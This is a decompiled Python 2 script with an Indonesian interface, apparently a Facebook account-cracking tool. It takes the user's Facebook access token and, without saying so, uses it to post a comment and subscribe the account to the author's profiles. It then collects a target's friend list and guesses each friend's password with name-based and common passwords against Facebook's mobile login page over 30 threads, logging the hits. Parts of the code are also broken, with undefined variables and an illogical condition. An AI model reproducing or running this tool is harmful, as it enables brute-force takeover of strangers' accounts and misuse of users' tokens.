# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: /sdcard/bfr.py
# Compiled at: 2021-11-07 21:21:31
import os, sys, random, time
try:
    import re, json, requests
except ImportError:
    print ' [-] module requests belum terinstall '
    print ' [-] silahkan ketik > pip2 install requests'

try:
    from requests.exceptions import ConnectionError
    from datetime import datetime
    from multiprocessing.pool import ThreadPool
except ConnectionError:
    print ' [-] check your internet Connection '

loop = 0
id = []
ra_pw = []
ku = '\x1b[1;93m'
hj = '\x1b[1;92m'
ml = '\x1b[1;101m'
ra = '\x1b[0m'
m = '\x1b[1;91m'
bm = '\x1b[1;96m'
ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420'
pw_rafi = 'rafianonym'
try:
    ip = requests.get('https://api.ipify.org').text
except ConnectionError:
    print '\n [!] check your internet Connection !\n'
    time.sleep(1)

garis = '__________________________________________________\n'

def jalan(z):
    for i in z + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.1)


rafi_logo = '\n\x1b[1;96m ______   _______  ______  \n(\x1b[1;96m____  \\ (_______)(_____ \\ \t\x1b[0m[ \x1b[1;91mRAFI KHALBI\x1b[0m ]\n \x1b[1;96m____)  ) _____    _____) )\n\x1b[1;96m|  __  ( |  ___)  |  __  / \n\x1b[1;96m| |__)  )| |      | |  \\ \\ \n\x1b[1;96m|______/ |_|      |_|   |_|\n\x1b[1;101m\x1b[1;97mCreat by : RAFI1990 => 7 November 2021\x1b[0m\n__________________________________________________\n'

def login():
    os.system('clear')
    try:
        token = open('login_r.txt', 'r')
        menu()
    except (KeyError, IOError):
        print rafi_logo
        print ' [1] login with token facebook '
        print ' [0] exit \n'
        met_log = raw_input(' [\x1b[101m\x1b[1;97m?\x1b[0m] pilih : ')
        if met_log == '':
            print '\n [!] mohon di isi '
            time.sleep(1)
            login()
        elif met_log == '1' or met_log == '01':
            tokenz()
        elif met_log == '0':
            jalan(' [R] silahkan kembali lagi ')
            os.system('exit')
        else:
            login()


def tokenz():
    os.system('clear')
    print rafi_logo
    try:
        token = open('login_r.txt', 'r')
    except (KeyError, IOError):
        token = raw_input(' [\x1b[101m?\x1b[0m] token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            avsid = open('login_r.txt', 'w')
            avsid.write(token)
            avsid.close()
            follow_my_account()
            jalan(' [!] login succes....')
        except KeyError:
            print ' [!] token salah '


def follow_my_account():
    try:
        token = open('login_r.txt', 'r').read()
    except IOError:
        print ' invalid token ! '
        jalan(' please login again')
        os.system('rm -rf login_r.txt')

    kom_r = 'lopyu bang rafi'
    requests.post('https://graph.facebook.com/148068940881574/comments/?message=' + kom_r + '&access_token=' + token)
    requests.post('https://graph.facebook.com/100070354054405/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100067770738028/subscribers?access_token=' + token)
    menu()


def menu():
    global token
    os.system('clear')
    try:
        token = open('login_r.txt', 'r').read()
    except IOError:
        jalan(' [!] token invalid ')
        os.system('clear')
        os.system('rm -rf login_r.txt')
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        jalan(' [!] invalid token ')
        os.system('rm -rf login_r.txt')
        login()
    except requests.exceptions.ConnectionError:
        print ' [!] check your Internet connection '

    print rafi_logo
    print ' [%s-%s] facebook user : %s' % (ml, ra, nama)
    print ' [%s-%s] ip user : %s' % (ml, ra, ip)
    print ' [%s-%s] id user : %s\n' % (ml, ra, id)
    print ' [%s1%s] start crack ' % (hj, ra)
    print ' [%s2%s] hapus token ' % (ku, ra)
    print ' [%s0%s] logout\n ' % (m, ra)
    asw = raw_input(' [?] pilih : ')
    if asw == '1' or asw == '01':
        crack()
    elif asw == '2' or asw == '02':
        jalan(' [!] menghapus token....')
        time.sleep(1)
        os.system('rm -rf login_r.txt')
        login()
    elif asw == '0':
        jalan(' [!] silahkan datang kembali ')
        os.system('exit')
    elif asw == '' or asw == ' ':
        jalan(' [!] harap di isi ')
        menu()
    else:
        jalan(' [!] hanya pilih yang ada di menu ')
        menu()


def crack():
    global token
    os.system('clear')
    print rafi_logo
    try:
        token = open('login_r.txt', 'r').read()
    except IOError:
        print ' [!] invalid token '
        tokenz()

    ra_id = raw_input(' [\x1b[101m\x1b[1;97m?\x1b[0m] ID Public : ')
    try:
        pok = requests.get('https://graph.facebook.com/' + ra_id + '?access_token=' + token)
        sp = json.loads(pok.text)
    except KeyError:
        jalan(' [!] Id tidak ditemukan ')

    r = requests.get('https://graph.facebook.com/' + ra_id + '/friends?access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        rax_x = i['id']
        name = i['name']
        id.append(rax_x + '<=>' + name)

    print ' [\x1b[101m\x1b[1;97m-\x1b[0m] Total ID  : ' + str(len(id))
    print garis
    print ' \t\t\x1b[1;101m\x1b[1;97mCTRL + Z FOR STOP\x1b[0m'
    print garis

    def main(user):
        global loop
        global token
        ra_pw = []
        sys.stdout.write('\r [%sC] berjalan %s - %s please wait.. ! ' % (ra, loop, len(id)))
        sys.stdout.flush()
        try:
            os.mkdir('results')
        except OSError:
            pass

        rax_x, name = user.split('<=>')
        for ss in name.split(' '):
            if len(ss) < 3:
                continue
            elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
                ra_pw.append(name)
                ra_pw.append(ss + '12')
                ra_pw.append(ss + '123')
                ra_pw.append(ss + '1234')
                ra_pw.append(ss + '12345')
            else:
                ra_pw.append('sayang')
                ra_pw.append('kontol')
                ra_pw.append('bismillah')

        try:
            for pw in ra_pw:
                pw = pw.lower()
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print (
                     '\r  ==-[ ' + rax_x + '|' + pw + '       ', ']-==')
                    ok.append(rax_x + '|' + pw)
                    save.write('  [ OK ] ' + str(rax_x) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login_r.txt').read()
                        url = 'https://graph.facebook.com/' + rax_x + '?access_token=' + token
                        data = s.get(url).json()
                        tgllhr = data['birthday'].replace('/', '-')
                        nama = data['name']
                        print '\r  \x1b[1;96m[ CP ] ' + rax_x + ' <-> ' + pw + ' <-> ' + tgllhr
                        cp.append(rax_x + ' <-> ' + pw + ' <-> ' + tgllhr)
                        save.write('  [ CP ] ' + str(rax_x) + ' <-> ' + str(pw) + ' <-> ' + tgllhr + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        tgllhr = ' '
                    except:
                        pass

                    print '\r  \x1b[1;96m [ CP ] ' + rax_x + ' <-> ' + pw + '       '
                    cp.append(rax_x + '|' + pw)
                    save.write('  [ CP ] ' + str(rax_x) + ' <-> ' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    exit(' \n[!] selesai ')


if __name__ == '__main__':
    login()
# okay decompiling gg.pyc
